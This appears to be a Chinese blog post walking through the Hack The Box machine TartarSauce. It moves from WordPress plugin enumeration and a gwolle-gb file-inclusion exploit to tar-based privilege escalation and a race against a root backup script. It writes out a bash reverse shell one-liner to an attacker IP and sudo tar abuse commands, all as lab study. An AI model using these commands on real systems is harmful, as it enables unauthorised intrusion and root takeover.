@@ -1,0 +1,180 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/K4TDWBpRGyV9h434FplL0g)
+
+一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)
+
+  
+
+  
+
+大家好，这里是 **大余安全** 的第 **130** 篇文章，本公众号会每日分享攻防渗透技术给大家。
+
+  
+
+靶机地址：https://www.hackthebox.eu/home/machines/profile/138
+
+靶机难度：中级（4.7/10）
+
+靶机发布日期：2018 年 10 月 28 日
+
+靶机描述：
+
+TartarSauce is a fairly challenging box that highlights the importance of a broad remote enumeration instead of focusing on obvious but potentially less fruitful attack vectors. It features a quite realistic privilege escalation requiring abuses of the tar command. Attention to detail when reviewing tool output is beneficial when attempting this machine.
+
+请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。
+
+  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/3CSGsOUQKfsq2MZPDdCbRx4QOq5Hu6gwrOCquO8aT36jQ9E11LOX3TlAkU4FMhGlA2GtyiaXia4DpyEf9A6cZHXg/640?wx_fmt=png)
+
+一、信息收集
+
+![](https://mmbiz.qpic.cn/mmbiz_png/CFzCpw2dZa6XK6W3JRCld4jmp0GibCWLXUqvXCSUQzVI4ROVn3Quu5KWKhPcaUMe5MicicTrXO0YGPLY2OyXoiaeEA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq41TbXHZaqcFaOAUsvzoX650qK7pKhAa5sMicCayx32BatCaV3vWsEX7A/640?wx_fmt=png)
+
+可以看到靶机的 IP 是 10.10.10.88....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4pAVSmAeoMAMAWWM3u63BR1bFCJrguwDmX9kykhWibwZLsk9feSXr3gw/640?wx_fmt=png)
+
+nmap 扫描发现 80 端口上 Apache 存在几个子目录...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4HjJXc9uLGVpIojhCpbUbIv4Jk0mp52XbGfaF1S8Wm4OicsfaValwdHQ/640?wx_fmt=png)
+
+访问 apache 一瓶汽水...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4UIV0mK1BBz6KVpAGNQgjq4YvQ2TqeM3iaWWgKGE9DCmLWkIt7Mox3Jw/640?wx_fmt=png)
+
+经过直接对 nmap 发现的目录进行各种枚举... 发现了 / wp 子目录...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4pLnxfsSZr6WA5O46xRj3oKdE1ls3SMaU5bAy6Yo6AbkHZYHHAcqbfg/640?wx_fmt=png)
+
+访问后发现这是 wordpress 框架页面...404 报错.. 遭到了破坏? 上篇文章也遇到了，直接添加域名到 hosts 即可正常显示...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4H5bCBfowFWYyz930dtOl1icr2z8n15W3IxBCJiaJ1fjwbiaMqEzIeD8jQ/640?wx_fmt=png)
+
+```
+wpscan --url http://10.10.10.88/webservices/wp --enumerate p --api-token kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc
+```
+
+wordpress 直接利用 wpscan 进行渗透... 可以看到开始是没有 API... 前往 wpscan 官网免费注册一天可以扫 50 次，获得 API 直接利用在继续....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4My9mfjMgv1LT8mFwdic2OF5eQhXC0gxaAW0Xiccl5ZJ1zaI74dnIPOWQ/640?wx_fmt=png)
+
+发现 gwolle-gb 中存在远程文件包含漏洞...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4hXnaZUtH76t3o1ZqCZNULESXHrJs4wZhLJtG86vypVUXgEeKvtvia9Q/640?wx_fmt=png)
+
+查看 EXP... 下载下来...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4wibyppY3GpPnyh5qqthXz6wAlyG1zEkib8ez8iatIgeVXk0xDrRZLa8wg/640?wx_fmt=png)
+
+阅读后利用 EXP 方法即可文件上传提权...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4FhBVeGQgBZ96vGXTonquAMfp6MpQH4hgnVJZqI9OuOPq9WN41fVhLA/640?wx_fmt=png)
+
+简单 shell 通过 EXP 上传访问，即可获得反向外壳.... 成功获得了 www 低权用户...
+
+这里利用了 gwolle 漏洞提权...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq42rbtSrqoYaDddhyTZ9tgVqhexFX4JhPU7SH3hRUiaCMO5TdOkuwR0HQ/640?wx_fmt=png)
+
+```
+echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.51/7777 0>&1' > dayu.sh
+tar -cvf dayu.tar dayu.sh
+```
+
+权限很低，无法进入用户目录...
+
+枚举发现 sudo -l 中以 tar 用户身份运行 onuma 可以提升到用户权限...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4puNhIOHFwKNItFB2avOlZFgylAaVkR4eAcTOohebJCrqI7kUfhTPew/640?wx_fmt=png)
+
+```
+sudo -u onuma tar -xvf dayu.tar --to-command /bin/bash
+```
+
+成功提升权限，获得了 user_flag 信息....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4ZT8nicAQPLGUfoTg8rp647I0SIPE5N1zKMic1s3hmGaMfictPtoPlorzw/640?wx_fmt=png)
+
+这里通过 LinEnum 枚举目前未发现可利用地方...
+
+上传 pspy 监控进程看看...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq48RXVtta7LJGBICeoxOiaT5SsSsm4Jx6AXy0p8vSdpFwyYR6cfLZfDHg/640?wx_fmt=png)
+
+发现每五分钟 / usr/sbin/backuperer 会自动以 root 权限执行...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4FpMJCiaueiaeebYW9DHndYMVFZFiciaPepkNvpMrtmGvbwoouRQzHHD7pA/640?wx_fmt=png)
+
+查看 backuperer 内容得出：
+
+1、会从 / var/tmp 和 / var/tmp/check 文件夹中删除带点文件？
+
+2、会将 / var/www/html 用户 onuma 的内容压缩 / 存档到文件 / var/tmp 中，文件的名称以点名开头？
+
+3、带点文件存在 30 秒。
+
+4、会创建 / var/tmp/check 目录。
+
+5、将先前解压的内容作为根提取到 / var/tmp/check 目录中。
+
+6、diff 对 / var/www/htmlvs 进行对抗 / var/tmp/check/var/www/html
+
+目录中的文件会以 root 权限执行...
+
+那这样可以抓住 30 秒时间，每到五分钟归零新一轮开始时开始计算 30 秒时间，当归零时会生成一个带点文件，30 秒后会自动删除，期间如果是 tar，会自动解压到 check 目录下...
+
+只需要利用 30 秒时间插入个简单 shell 复制到带点文件，带点文件 30 秒后会自动解压 shell 到 check 目录下，就可以以 root 权限执行了，获得反弹外壳... 开始
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq49HsaT3sjPVwsxppBQ38UElsEgmZanywibzM1WFmqSvmsJBDxj8Kb5lA/640?wx_fmt=png)
+
+首先在本地按照 backuperer 脚本提示，还原方法创建了 shell.tar 文本...
+
+将其上传到靶机 / var/tmp 目录下...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq45WsUV0P2tiaFTticq7rINaIgO1J5n0xfCgnbYA0qPZuvKMiaEE98Tiazcg/640?wx_fmt=png)
+
+利用 systemctl list-timers 查看 backuperer 进程的运行时间...
+
+等待 LEFT 倒计时归零时，ls -la 在 tmp 目录下查看到带点的文件，cp 刚上传的 shell.tar 到带点文件即可...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4GKtpPjY4xtmV2qIySIJK7GRKX5v69VjRksTU4TBJL8Br3rR1EnIfOA/640?wx_fmt=png)
+
+过 10 秒左右，脚本会自动解压到 check 目录，如果未生成 check 说明失败... 检查前面操作...
+
+在 check 下，查看到了 shell 具有 root 执行权限...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KM0IWnIribrQHbGRfnkhMRq4gKpJrCZicou52CVZdNibTCqW6qqKg7eDaE2sPk7gOzwH1ACpOqpSic9QQ/640?wx_fmt=png)
+
+  
+
+执行后获得了 root 权限，查看到了 root_flag 信息...
+
+这台就不总结了，思路很好... 加油
+
+由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。
+
+如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。
+
+  
+
+如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)
+
+随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**
+
+欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+大余安全
+
+一个全栈渗透小技巧的公众号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)
